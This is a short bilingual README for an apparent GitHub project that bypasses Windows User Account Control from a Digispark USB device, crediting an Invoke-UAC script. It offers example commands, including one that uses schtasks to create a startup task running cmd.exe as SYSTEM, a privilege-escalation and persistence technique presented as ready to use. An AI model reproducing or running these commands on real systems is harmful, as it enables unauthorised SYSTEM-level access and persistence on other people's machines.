# ByPassUAC-DigisPark

Credits: https://github.com/BlackShell256/Invoke-UAC

You can modify this line to do different tasks, for example:
Puedes modificar esta linea para hacer diferentes tareas, por ejemplo:
![image](https://github.com/Kidd3n/ByPassUAC-DigisPark/assets/89719224/c7d7262b-de1b-494b-a885-96422f591808)

```
Invoke-UAC -Executable powershell -Command "ls"
```

```
Invoke-UAC -Executable schtasks -Command "/create /tn UAC /tr 'cmd.exe' /sc onstart /ru System"
```
